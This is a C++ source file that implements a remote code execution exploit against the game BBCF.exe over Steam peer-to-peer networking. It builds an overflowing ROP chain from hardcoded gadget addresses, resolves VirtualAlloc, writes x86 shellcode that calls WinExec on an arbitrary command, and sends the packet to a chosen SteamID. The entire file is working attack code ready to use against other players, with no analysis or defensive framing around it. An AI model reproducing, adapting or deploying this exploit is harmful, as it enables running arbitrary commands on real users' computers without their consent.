#include "Include.h"

const std::uint8_t executeCmdShellcode[] = { 0xA1, 0x3C, 0x00, 0xB0, 0x00, 0x50, 0x68, 0x44, 0x00, 0xB0, 0x00, 0x68, 0x30, 0x00, 0xB0, 0x00, 0x68, 0x1C, 0x00, 0xB0, 0x00, 0x8B, 0x0D, 0x04, 0xC1, 0x81, 0x00, 0xFF, 0xD1, 0x50, 0x8B, 0x15, 0x94, 0xC2, 0x81, 0x00, 0xFF, 0xD2, 0xFF, 0xD0, 0xC3 };

/*
mov    eax,ds:0xB0003C				// showCmd
push   eax
push   0xB00044						// cmd
push   0xB00030						// "WinExec"
push   0xB0001C						// "Kernel32.dll"
mov    ecx,DWORD PTR ds:0x81c104	// GetModuleHandleA from imports
call   ecx							// hKernel32 = GetModuleHandleA("Kernel32.dll");
push   eax							// Push hKernel32
mov    edx,DWORD PTR ds:0x81c294	// GetProcAddress from imports
call   edx							// pWinExec = GetProcAddress(hKernel32, "WinExec");
call   eax							// pWinExec(cmd, showCmd)
ret
*/

std::uintptr_t pStorage = 0xB00000;
std::uintptr_t ppGetModuleHandleA = 0x81C104;

//Gadgets
std::uintptr_t pNop = 0x406887;
std::uintptr_t pPop_Eax = 0x41A066;
std::uintptr_t pMov_Eax_dEax = 0x40F9B9;
std::uintptr_t pCall_Eax = 0x7A0B84;
std::uintptr_t pPop_Ecx = 0x401018;
std::uintptr_t pMov_dEcx_Eax = 0x4F691E;
std::uintptr_t pAdd_Eax_4 = 0x404833;
std::uintptr_t pAdd_Eax_Ecx = 0x458EDA;
std::uintptr_t pXchg_Ecx_Eax = 0x5A569B;

PayloadContext::PayloadContext()
{
	payload = std::vector<std::uintptr_t>(0x412, pNop); // This will overflow a bunch on the target so we hit the return address for our ROP chain.
	storageWritePtr = pStorage;
}

// Call function from memory in remote process.
std::uintptr_t PayloadContext::Rop_CallFunction(std::uintptr_t address, const std::vector<std::uintptr_t>& params, bool storeReturn, unsigned int dereferenceCount)
{
	std::uintptr_t result = 0; // Address of stored return value.

	Push(pPop_Eax);
	Push(address);

	for (unsigned int i = 0; i < dereferenceCount; i++)
		Push(pMov_Eax_dEax);

	Push(pCall_Eax);

	for (const auto& param : params)
		Push(param);

	if (storeReturn)
	{
		result = storageWritePtr;
		Push(pPop_Ecx);
		Push(storageWritePtr);
		Push(pMov_dEcx_Eax);
		storageWritePtr += sizeof(std::uintptr_t);
	}

	return result;
}

// Store data in remote process, add some padding.
void PayloadContext::Rop_WriteToAddress(std::uintptr_t address, const void* buffer, size_t& size, unsigned int dereferenceCount)
{
	size += sizeof(std::uintptr_t);
	std::vector<std::uint8_t> bufferPadded(size, 0);
	memcpy_s(bufferPadded.data(), bufferPadded.size(), buffer, size);

	Push(pPop_Eax);
	Push(address);
	for (unsigned int i = 0; i < dereferenceCount; i++)
		Push(pMov_Eax_dEax);

	size_t i = 0;
	for (i; i < size; i += sizeof(std::uintptr_t))
	{
		Push(pPop_Ecx);
		Push(((std::uintptr_t*)bufferPadded.data())[i / sizeof(std::uintptr_t)]);
		Push(pXchg_Ecx_Eax);
		Push(pMov_dEcx_Eax);
		Push(pXchg_Ecx_Eax);
		Push(pAdd_Eax_4);
	}

	size = i;
}

std::uintptr_t PayloadContext::Rop_AppendToStorage(const void* buffer, size_t size)
{
	Rop_WriteToAddress(storageWritePtr, buffer, size);
	auto result = storageWritePtr;
	storageWritePtr += size;
	return result;
}

// Allocate executable memory in remote process, store our shellcode there, jump to the allocated shellcode.
void PayloadContext::Rop_AllocateAndExecuteShellcode(const void* shellcode, size_t size, const std::vector<std::string>& storage)
{
	//Allocate executable memory.
	auto ppVirtualAllocRemote = Rop_FindVirtualAlloc();

	auto ppPayloadLocation = Rop_CallFunction(ppVirtualAllocRemote, std::vector<std::uintptr_t>{NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, true, 1);
	Rop_WriteToAddress(ppPayloadLocation, shellcode, size, 1);

	// Store data used by shellcode.
	for (const auto& entry : storage)
		auto remote = Rop_AppendToStorage((void*)entry.data(), entry.size() + 1);

	// Run shellcode.
	Rop_CallFunction(ppPayloadLocation, std::vector<std::uintptr_t>{}, false, 1);
}

// BBCF.exe doesn't import a function to allocate executable memory, we instead find VirtualAlloc in iDmacDrv32.dll which should be common across all clients.
std::uintptr_t PayloadContext::Rop_FindVirtualAlloc()
{
	const char* sziDmacDrv32 = "iDmacDrv32.dll";
	auto sziDmacDrv32Remote = Rop_AppendToStorage((void*)sziDmacDrv32, strlen(sziDmacDrv32) + 1);
	Rop_CallFunction(ppGetModuleHandleA, std::vector<std::uintptr_t>{sziDmacDrv32Remote}, false, 1); // Retrieve dynamic module base in remote process.
	Push(pPop_Ecx);
	Push(0xC12C); // Offset to VirtualAlloc in import table of iDmacDrv32.dll.
	Push(pAdd_Eax_Ecx);
	Push(pMov_Eax_dEax);
	Push(pPop_Ecx);
	Push(storageWritePtr);
	Push(pMov_dEcx_Eax);
	auto result = storageWritePtr;
	storageWritePtr += sizeof(std::uintptr_t);
	return result;
}

void PayloadContext::Push(std::uintptr_t value)
{
	payload.push_back(value);
}

// Get a sendable buffer.
std::vector<std::uint8_t> PayloadContext::Serialize()
{
	auto packet = std::vector<std::uint8_t>(payload.size() * sizeof(std::uintptr_t));
	memcpy_s(packet.data(), packet.size(), payload.data(), payload.size() * sizeof(std::uintptr_t));
	return packet;
}

// Setup & send exploit payload with a call to WinExec to run system commands remotely.
void RCE::ExecuteCmdOnSteamID(const CSteamID& steamID, const std::string& cmd, int showCmd)
{
	PayloadContext context;
	auto shellcode = std::vector<std::uint8_t>(sizeof(executeCmdShellcode));
	memcpy_s(shellcode.data(), shellcode.size(), executeCmdShellcode, sizeof(executeCmdShellcode));
	auto storage = std::vector<std::string>{ "Kernel32.dll", "WinExec", std::string(1, (char)showCmd), cmd };
	context.Rop_AllocateAndExecuteShellcode(shellcode.data(), shellcode.size(), storage);
	SendToSteamID(steamID, context.Serialize(), 3); // Port 3 to reach vulnerable code.
}

// Send message over SteamNetworking API to target peer.
void RCE::SendToSteamID(const CSteamID& steamID, const std::vector<std::uint8_t>& packet, int port)
{
	if (steamID.IsValid())
	{
		BBCF::SteamInterfaces interfaces{};
		if (BBCF::GetSteamInterfaces(&interfaces) && interfaces.steamNetworking005)
			interfaces.steamNetworking005->SendP2PPacket(steamID, packet.data(), packet.size(), EP2PSend::k_EP2PSendReliable, port);
	}
}